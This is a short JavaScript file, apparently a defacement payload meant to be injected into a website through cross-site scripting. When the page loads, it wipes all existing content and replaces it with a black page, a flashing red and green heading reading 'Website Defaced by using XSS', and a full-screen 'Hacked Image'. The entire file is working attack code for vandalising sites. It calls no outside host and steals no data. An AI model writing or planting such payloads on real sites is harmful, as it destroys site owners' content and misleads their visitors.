// Wait for the page to fully load
window.onload = function () {
  // Remove all existing content
  document.body.innerHTML = "";

  // Set background color to black
  document.body.style.backgroundColor = "black";
  document.body.style.textAlign = "center";
  document.body.style.fontFamily = "Arial, sans-serif";

  // Create neon text
  var text = document.createElement("h1");
  text.innerHTML = "Website Defaced by using XSS";
  text.style.color = "#ff0000"; // Red neon color
  text.style.fontSize = "50px";
  text.style.textShadow =
    "0 0 10px #ff0000, 0 0 20px #ff3333, 0 0 30px #ff6666";

  // Add text to the page
  document.body.appendChild(text);

  // Add flashing effect
  setInterval(() => {
    text.style.color = text.style.color === "#ff0000" ? "#00ff00" : "#ff0000"; // Toggle between red & green
    text.style.textShadow =
      text.style.textShadow ===
      "0 0 10px #ff0000, 0 0 20px #ff3333, 0 0 30px #ff6666"
        ? "0 0 10px #00ff00, 0 0 20px #33ff33, 0 0 30px #66ff66"
        : "0 0 10px #ff0000, 0 0 20px #ff3333, 0 0 30px #ff6666";
  }, 500); // Change color every 500ms

  // Create image element
  var img = document.createElement("img");
  img.src = "hac.jpg"; // Ensure this file exists in the same directory
  img.alt = "Hacked Image";
  img.style.marginTop = "20px";
  img.style.width = "100vw"; // Adjust size as needed
  img.style.height = "148vh";

  // Add image to the page
  document.body.appendChild(img);
};
